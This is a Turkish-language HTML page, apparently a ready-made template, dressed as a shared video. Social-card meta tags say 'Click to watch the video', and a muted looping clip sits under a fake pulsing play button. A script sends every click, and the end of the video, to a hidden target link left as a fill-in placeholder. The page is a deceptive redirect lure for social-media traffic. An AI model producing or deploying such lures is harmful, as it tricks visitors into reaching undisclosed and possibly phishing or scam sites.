<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Video</title>

<!-- Twitter / X -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Videoyu İzlemek İçin Tıkla">
<meta name="twitter:description" content="Videoyu izlemek için dokun.">

<!-- Open Graph -->

<meta property="og:image" content="https://zaferfoca.github.io/video-paylasim/HOH2G89WUaARMat.jpg">
<meta property="og:type" content="website">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
}

html,body{
width:100%;
height:100%;
background:#000;
overflow:hidden;
cursor:pointer;
font-family:Arial,Helvetica,sans-serif;
}

#video{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
object-fit:cover;
background:#000;
}

#overlay{
position:fixed;
inset:0;
display:flex;
justify-content:center;
align-items:center;
pointer-events:none;
}

#play{
width:90px;
height:90px;
border-radius:50%;
background:rgba(255,255,255,.20);
backdrop-filter:blur(8px);
display:flex;
justify-content:center;
align-items:center;
font-size:38px;
color:white;
animation:pulse 1.8s infinite;
}

@keyframes pulse{

0%{
transform:scale(1);
}

50%{
transform:scale(1.08);
}

100%{
transform:scale(1);
}

}

</style>

</head>

<body>

<video
id="video"
autoplay
muted
playsinline
loop>

<source src="cutting_orange_tuil_2000kbps_720p_59.94fps_h264.mp4" type="video/mp4">

</video>

<div id="overlay">
<div id="play">▶</div>
</div>

<script>

const HEDEF_SITE="https://BURAYA_LINKINI_YAZ";

function git(){
window.location.href=HEDEF_SITE;
}

document.body.addEventListener("click",git);

const video=document.getElementById("video");

video.addEventListener("ended",git);

// Bazı telefonlarda autoplay engellenirse
video.play().catch(()=>{});

</script>

</body>
</html>
